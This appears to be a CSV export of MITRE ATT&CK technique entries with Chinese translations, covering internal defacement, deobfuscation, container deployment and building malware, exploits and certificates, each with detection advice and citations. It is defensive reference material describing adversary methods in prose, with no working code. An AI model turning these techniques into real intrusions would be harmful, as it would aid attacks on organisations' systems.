T1491.001,Defacement: Internal Defacement,"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)",https://attack.mitre.org/techniques/T1491/001,20 February 2020,28 July 2022,1.1,Impact,"Monitor internal and websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","Linux, Windows, macOS","Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content",True,T1491,,,,,,,Integrity,,"(Citation: Check Point Meteor Aug 2021),(Citation: Fortinet Diavol July 2021),(Citation: CERT-EE Gamaredon January 2021),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Ready.gov IT DRP)",污染并损坏数据：内部污染和损坏,攻击者可能会破坏组织内部的系统，以试图恐吓或误导用户，从而破坏系统的完整性。这可能采取对内部网站进行修改的形式，或者通过更换桌面壁纸直接对用户系统进行修改。（引文：Novetta Blockbuster）令人不安或令人反感的图像可能被用作 [Internal Defacement] 的一部分（https:// attack.mitre.org/techniques/T1491/001）以引起用户不适，或迫使用户遵守随附的消息。由于内部破坏系统暴露了对手的存在，它通常发生在其他入侵目标完成之后。（引用：Novetta Blockbuster Destructive Malware）
T1140,Deobfuscate/Decode Files or Information,"Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.

One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)

Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)",https://attack.mitre.org/techniques/T1140,14 December 2017,05 May 2022,1.1,Defense Evasion,"Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).

Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.","Linux, Windows, macOS","File: File Modification, Process: Process Creation, Script: Script Execution",False,,"Anti-virus, Host Intrusion Prevention Systems, Network Intrusion Detection System, Signature-based Detection","Matthew Demaske, Adaptforward; Red Canary",,,,,,,"(Citation: Talos Smoke Loader July 2018),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Proofpoint Azorult July 2018),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: CISA SoreFang July 2016),(Citation: Cyberreason Anchor December 2019),(Citation: Cybereason Valak May 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Intezer HiddenWasp Map 2019),(Citation: Joe Sec Trickbot),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: ESET Gamaredon June 2020),(Citation: Trend Micro Waterbear December 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: TrendMicro TropicTrooper 2015),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: McAfee Sodinokibi October 2019),(Citation: Cylance Sodinokibi July 2019),(Citation: ATT QakBot April 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Trend Micro Tick November 2019),(Citation: CISA AA20-301A Kimsuky),(Citation: Symantec RAINDROP January 2021),(Citation: FinFisher Citation),(Citation: Arxiv Avaddon Feb 2021),(Citation: Carbon Black Shlayer Feb 2019),(Citation: ESET Zebrocy Nov 2018),(Citation: Kaspersky QakBot September 2021),(Citation: Microsoft DUBNIUM July 2016),(Citation: OilRig New Delivery Oct 2017),(Citation: Securelist Dtrack),(Citation: Securelist Darkhotel Aug 2015),(Citation: Trend Micro Iron Tiger April 2021),(Citation: CoinTicker 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: Cybereason Bazar July 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: NHS Digital Egregor Nov 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: Medium Metamorfo Apr 2020),(Citation: Talos Lokibot Jan 2021),(Citation: MuddyWater TrendMicro June 2018),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Accenture HyperStack October 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: Intel 471 REvil March 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: NCC Group TA505),(Citation: Unit42 BendyBear Feb 2021),(Citation: ESET ForSSHe December 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Prevailion DarkWatchman 2021),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: ESET LightNeuron May 2019),(Citation: NCC Group Fivehands June 2021),(Citation: Unit 42 NOKKI Sept 2018),(Citation: ProofPoint Ursnif Aug 2016),(Citation: Trustwave Pillowmint June 2020),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: Threatpost Hancitor),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: SecureWorks August 2019),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Zscaler Higaisa 2020),(Citation: McAfee Sharpshooter December 2018),(Citation: CheckPoint Naikon May 2020),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: CIRCL PlugX March 2013),(Citation: Unit42 Molerat Mar 2020),(Citation: Cybereason PowerLess February 2022),(Citation: Unit 42 BackConfig May 2020),(Citation: 20 macOS Common Tools and Techniques),(Citation: Unit 42 Valak July 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Cisco Ukraine Wipers January 2022),(Citation: ESET PipeMon May 2020),(Citation: FBI FLASH APT39 September 2020),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Unit 42 Shamoon3 2018),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: ESET Telebots July 2017),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: ESET Industroyer),(Citation: Cybereason Kimsuky November 2020),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: JPCert TSCookie March 2018),(Citation: IBM MegaCortex),(Citation: Malwarebytes Targeted Attack against Saudi Arabia),(Citation: objective-see windtail1 dec 2018),(Citation: NSA/FBI Drovorub August 2020),(Citation: Proofpoint TA505 October 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Novetta Winnti April 2015),(Citation: ESET Kobalos Jan 2021),(Citation: Unit 42 PingPull Jun 2022),(Citation: Accenture MUDCARP March 2019),(Citation: G Data Sodinokibi June 2019),(Citation: ESET Okrum July 2019),(Citation: ESET Ebury Oct 2017),(Citation: Check Point APT31 February 2021),(Citation: ESET Carbon Mar 2017),(Citation: BiZone Lizar May 2021),(Citation: Flashpoint FIN 7 March 2019),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Check Point APT34 April 2021),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Talent-Jump Clambling February 2020),(Citation: ESET Grandoreiro April 2020),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Proofpoint Bumblebee April 2022),(Citation: IBM TA505 April 2020),(Citation: Proofpoint ZeroT Feb 2017),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: CheckPoint Bandook Nov 2020),(Citation: APT15 Intezer June 2018),(Citation: Symantec Dyre June 2015),(Citation: Malwarebytes Konni Aug 2021),(Citation: FireEye MESSAGETAP October 2019),(Citation: Cisco Talos Intelligence Group),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Cylance Dust Storm),(Citation: Microsoft Actinium February 2022),(Citation: Unit 42 Bisonal July 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Eset Ramsay May 2020),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Morphisec ShellTea June 2019),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Unit 42 QUADAGENT July 2018),(Citation: CISA ComRAT Oct 2020),(Citation: Medium Babuk February 2021),(Citation: Medium KONNI Jan 2020),(Citation: Unit 42 RGDoor Jan 2018),(Citation: Secureworks REvil September 2019),(Citation: PWC WellMess July 2020),(Citation: Malwarebytes Higaisa 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Microsoft NICKEL December 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Symantec Sowbug Nov 2017),(Citation: Check Point Warzone Feb 2020),(Citation: Securelist Remexi Jan 2019),(Citation: Lazarus APT January 2022),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Talos Rocke August 2018),(Citation: NCC Group Team9 June 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: Unit 42 Lucifer June 2020),(Citation: Securelist LuckyMouse June 2018),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: NCSC Cyclops Blink February 2022),(Citation: ESET InvisiMole June 2020),(Citation: Unit42 Cannon Nov 2018),(Citation: ESET InvisiMole June 2018),(Citation: Palo Alto Networks BBSRAT),(Citation: ESET ComRAT May 2020),(Citation: CrowdStrike IceApple May 2022),(Citation: CISA AppleJeus Feb 2021),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: PWC WellMess C2 August 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: Kaspersky MoleRATs April 2019),(Citation: Talos Zeus Panda Nov 2017),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Group IB GrimAgent July 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET Telebots Dec 2016),(Citation: Korean FSI TA505 2020),(Citation: Securelist APT10 March 2021),(Citation: FireEye Hancitor),(Citation: ESET Dukes October 2019),(Citation: Trend Micro Skidmap),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: US-CERT Bankshot Dec 2017),(Citation: Fidelis TrickBot Oct 2016),(Citation: Unit 42 Nokki Oct 2018),(Citation: Cybereason Egregor Nov 2020),(Citation: Symantec Orangeworm April 2018),(Citation: Check Point Sunburst Teardrop December 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Kaspersky Sodin July 2019),(Citation: ESET Gelsemium June 2021),(Citation: Rancor Unit42 June 2018),(Citation: NCC Group WastedLocker June 2020),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: CISA WellMail July 2020),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Lab52 WIRTE Apr 2019),(Citation: ClearSky Siamesekitten August 2021),(Citation: Talos Frankenstein June 2019),(Citation: MSTIC FoggyWeb September 2021),(Citation: Qualys LolZarus),(Citation: CarbonBlack Conti July 2020),(Citation: objsee mac malware 2017),(Citation: ESET Machete July 2019),(Citation: Chronicle Winnti for Linux May 2019),(Citation: Talos MuddyWater Jan 2022),(Citation: Gh0stRAT ATT March 2019),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye FiveHands April 2021),(Citation: Cybereason Conti Jan 2021),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Cybereason Astaroth Feb 2019),(Citation: ESET Casbaneiro Oct 2019),(Citation: Mcafee Clop Aug 2019),(Citation: Unit 42 Hildegard Malware),(Citation: Sophos Netwalker May 2020),(Citation: FireEye FIN7 Oct 2019),(Citation: FireEye APT10 Sept 2018),(Citation: Unit 42 KerrDown February 2019),(Citation: Malwarebytes Saint Bot April 2021),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Accenture Hogfish April 2018),(Citation: Cybereason Molerats Dec 2020),(Citation: Microsoft Expand Utility),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Unit42 RDAT July 2020),(Citation: Bitdefender Naikon April 2021),(Citation: TrendMicro Gamaredon April 2020),(Citation: sentinelone shlayer to zshlayer),(Citation: Talos PoetRAT October 2020),(Citation: Palo Alto Sofacy 06-2018),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Medium S2W WhisperGate January 2022),(Citation: CISA WellMess July 2020),(Citation: ANSSI Sandworm January 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Cyberint Qakbot May 2021),(Citation: Malwarebytes Dyreza November 2015),(Citation: Microsoft FinFisher March 2018),",去混淆/解码文件或信息,攻击者可能会使用 [混淆文件或信息](https://attack.mitre.org/techniques/T1027) 来隐藏入侵的工件以防分析。他们可能需要单独的机制来解码或去混淆该信息，具体取决于他们打算如何使用它。这样做的方法包括恶意软件的内置功能或使用系统上存在的实用程序。一个这样的例子是使用 [certutil](https://attack.mitre.org/software/S0160) 来解码隐藏在证书文件中的远程访问工具可移植可执行文件。 （引用：针对沙特阿拉伯的 Malwarebytes 针对性攻击）另一个示例是使用 Windows <code>copy /b</code> 命令将二进制片段重新组装成恶意负载。 （引用：Carbon Black Obfuscation 2016 年 9 月）有时，作为 [用户执行] (https://attack.mitre.org/techniques/T1204) 的一部分，可能需要用户打开它以进行去混淆或解密。用户还可能需要输入密码才能打开对手提供的受密码保护的压缩/加密文件。 （引用：Volexity PowerDuke 2016 年 11 月）
T1610,Deploy Container,"Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment.

Containers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow.(Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)",https://attack.mitre.org/techniques/T1610,29 March 2021,01 April 2022,1.1,"Defense Evasion, Execution","Monitor for suspicious or unknown container images and pods in your environment. Deploy logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application pods to detect malicious activity at the cluster level. In Docker, the daemon log provides insight into remote API calls, including those that deploy containers. Logs for management services or applications used to deploy containers other than the native technologies themselves should also be monitored.",Containers,"Application Log: Application Log Content, Container: Container Creation, Container: Container Start, Pod: Pod Creation, Pod: Pod Modification",False,,,"Alfredo Oliveira, Trend Micro; Ariel Shuper, Cisco; Center for Threat-Informed Defense (CTID); Idan Frimark, Cisco; Magno Logan, @magnologan, Trend Micro; Pawan Kinger, @kingerpawan, Trend Micro; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team","root, User",1.0,,,,,"(Citation: Aqua Kinsing April 2020),(Citation: Peirates GitHub),(Citation: Trend Micro TeamTNT),(Citation: Intezer TeamTNT September 2020),(Citation: Cisco Talos Intelligence Group),(Citation: Intezer Doki July 20),(Citation: Kubernetes API Control Access),(Citation: Docker Daemon Socket Protect),(Citation: Kubernetes Hardening Guide)",部署容器,攻击者可以将容器部署到环境中以促进执行或规避防御。在某些情况下，攻击者可能会部署新容器来执行与特定映像或部署相关联的进程，例如执行或下载恶意软件的进程。在其他情况下，攻击者可能会部署一个没有网络规则、用户限制等配置的新容器，以绕过环境中的现有防御。可以通过多种方式部署容器，例如通过 Docker 的 <code>create</code> 和 <code>start</code> API 或通过 Kubernetes 仪表板或 Kubeflow 等 Web 应用程序。（引用：Docker Containers API） （引用：Kubernetes Dashboard）（引用：Kubeflow Pipelines）攻击者可能会根据检索或构建的恶意图像或在运行时下载并执行恶意负载的良性图像部署容器。（引用：主机上的 Aqua 构建图像）
T1587,Develop Capabilities,"Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)

As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",https://attack.mitre.org/techniques/T1587,01 October 2020,17 October 2021,1.1,Resource Development,"Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time.

Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.",PRE,"Internet Scan: Response Content, Malware Repository: Malware Content, Malware Repository: Malware Metadata",False,,,,,,,,,,"(Citation: VirusBulletin Kimsuky October 2019),",开发能力/开发功能,攻击者可能会构建可在定位期间使用的能力。攻击者可以在内部开发自己的能力，而不是购买、免费下载或窃取能力。这是识别开发需求和构建解决方案（例如恶意软件、漏洞利用和自签名证书）的过程。攻击者可能会在攻击者生命周期的多个阶段开发支持其操作的能力。（引用：Mandiant APT1）（引用：Kaspersky Sofacy）（引用：Bitdefender StrongPity 2020 年 6 月）（引用：Talos Promethium 2020 年 6 月）与合法的开发工作一样，发展能力可能需要不同的技能组合。所需的技能可能位于内部，也可能需要外包。使用承包商可被视为对手开发能力的扩展，前提是对手在形成需求方面发挥作用并保持一定程度的能力排他性。
T1587.002,Develop Capabilities: Code Signing Certificates,"Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.

Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.",https://attack.mitre.org/techniques/T1587/002,01 October 2020,17 October 2021,1.1,Resource Development,"Consider analyzing self-signed code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, and common name. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in crafting self-signed code signing certificates.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as [Code Signing](https://attack.mitre.org/techniques/T1553/002) or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).",PRE,Malware Repository: Malware Metadata,True,T1587,,,,,,,,,"(Citation: Bitdefender StrongPity June 2020),(Citation: Unit 42 BackConfig May 2020),",开发能力/开发功能：代码签名证书,攻击者可能会创建可在定位期间使用的自签名代码签名证书。代码签名是对可执行文件和脚本进行数字签名以确认软件作者并保证代码未被更改或损坏的过程。代码签名为开发人员的程序提供了一定程度的真实性，并保证程序没有被篡改。（引用：维基百科代码签名）用户和/或安全工具可能比未签名的代码更信任签名的代码即使他们不知道谁颁发了证书或作者是谁。在 [代码签名](https://attack.mitre.org/techniques/T1553/002) 之前，攻击者可能会开发自签名代码签名证书以用于操作。
T1587.003,Develop Capabilities: Digital Certificates,"Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).

Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).

After creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",https://attack.mitre.org/techniques/T1587/003,01 October 2020,16 October 2021,1.2,Resource Development,"Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)

Detection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001), [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002), and/or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).",PRE,Internet Scan: Response Content,True,T1587,,,,,,,,,"(Citation: PWC WellMess July 2020),(Citation: Talos Promethium June 2020),(Citation: PWC WellMess C2 August 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),",开发能力/开发功能：数字证书,攻击者可能会创建可在定位期间使用的自签名 SSL/TLS 证书。 SSL/TLS 证书旨在灌输信任。它们包括有关密钥的信息、有关其所有者身份的信息以及已验证证书内容正确的实体的数字签名。如果签名是有效的，并且检查证书的人信任签名者，那么他们知道他们可以使用该密钥与其所有者进行通信。在自签名的情况下，数字证书将缺少与第三方证书颁发机构 (CA) 签名相关的信任元素。攻击者可能会创建自签名 SSL/TLS 证书，可用于进一步操作，例如使用 [ Web 协议](https://attack.mitre.org/techniques/T1071/001)) 甚至启用 [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)（如果添加）到信任根（即[安装根证书](https://attack.mitre.org/techniques/T1553/004)）。创建数字证书后，攻击者可以在其控制的基础设施上安装该证书（参见 [安装数字证书](https://attack.mitre.org/techniques/T1608/003)）。
T1587.004,Develop Capabilities: Exploits,"Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)

As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.

Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",https://attack.mitre.org/techniques/T1587/004,01 October 2020,15 April 2021,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",PRE,,True,T1587,,,,,,,,,",",开发能力/开发功能：利用,攻击者可能会开发出可在定位期间使用的漏洞。漏洞利用利用错误或漏洞来导致计算机硬件或软件上发生意外或意外行为。与其从在线查找/修改漏洞利用程序或从漏洞利用程序供应商处购买漏洞利用程序，攻击者可以开发自己的漏洞利用程序。（引用：NYTStuxnet）攻击者可以使用通过[漏洞]（https://attack.mitre.org/techniques/）获得的信息T1588/006) 集中开发开发工作。作为漏洞利用开发过程的一部分，攻击者可能会通过模糊测试和补丁分析等方法发现可利用的漏洞。（引用：Irongeek Sims BSides 2017）与合法的开发工作一样，开发漏洞利用可能需要不同的技能。所需的技能可能位于内部，也可能需要外包。使用承包商可以被认为是该对手的开发开发能力的扩展，前提是对手在制定需求方面发挥作用并保持对开发的初始程度的排他性。攻击者可能会在攻击者生命周期的各个阶段使用漏洞利用（即[利用面向公众的应用程序](https://attack.mitre.org/techniques/T1190)、[利用客户端执行](https://attack.mitre .org/techniques/T1203)，[用于提升权限的利用](https://attack.mitre.org/techniques/T1068)，[用于防御规避的利用](https://attack.mitre.org/techniques/T1211 )、[凭证访问的利用](https://attack.mitre.org/techniques/T1212)、[远程服务的利用](https://attack.mitre.org/techniques/T1210)和[应用程序或系统利用](https://attack.mitre.org/techniques/T1499/004))。
T1587.001,Develop Capabilities: Malware,"Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)

As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.

Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)",https://attack.mitre.org/techniques/T1587/001,01 October 2020,14 January 2022,1.2,Resource Development,"Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.",PRE,"Malware Repository: Malware Content, Malware Repository: Malware Metadata",True,T1587,,,,,,,,,"(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Microsoft NICKEL December 2021),(Citation: FBI Flash FIN7 USB),(Citation: FoxIT Wocao December 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Google TAG Lazarus Jan 2021),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Recorded Future Turla Infra 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: Unit 42 Hildegard Malware),(Citation: FireEye FIN7 Oct 2019),(Citation: ClearSky Lazarus Aug 2020),(Citation: Talos Kimsuky Nov 2021),(Citation: KISA Operation Muzabi),(Citation: BlackBerry CostaRicto November 2020),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Cylance Cleaver),",开发能力/开发功能：恶意软件,攻击者可能会开发可在定位期间使用的恶意软件和恶意软件组件。构建恶意软件可能包括开发有效负载、释放程序、后入侵工具、后门（包括后门图像）、打包程序、C2 协议以及创建受感染的可移动媒体。攻击者可能会开发恶意软件来支持他们的操作，创造一种手段来维持对远程机器的控制、逃避防御和执行攻击后行为。（引用：Mandiant APT1）（引用：Kaspersky Sofacy）（引用：ActiveMalwareEnergy）（引用：FBI Flash FIN7 USB) 